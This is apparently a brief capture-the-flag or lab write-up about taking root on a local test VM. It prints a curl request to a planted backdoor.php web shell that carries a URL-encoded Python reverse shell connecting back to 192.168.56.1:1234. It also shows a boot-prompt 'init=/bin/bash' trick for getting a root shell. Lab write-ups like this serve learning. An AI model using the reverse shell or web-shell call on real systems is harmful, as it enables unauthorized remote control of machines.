# writeup 2

We have to do in the same way as in **writeup1** until using **curl** tool))

After doing that we have an incredible way to get the control of the root

**BACKDOOR**

Do not scared, everything is done for educational purposes)

<img src="img/photo_5435923932709510476_y.jpg">

here is the encrepted code of it 

```
curl --insecure 'https://192.168.56.101/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.56.1%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27'
```



whenever we press **tab**, we'll see partitions that we can connect.

<img src="img/Pasted image 20240712011850.png">

and we write
```
#{partition} init=/bin/bash,
live init=/bin/bash
```
And we get the following result

<img src="img/Pasted image 20240712012047.png">

By the way, it turns out that this method works almost on all linux systems currently, and the only way to protect from this is to simply encrypt the disk 🙂
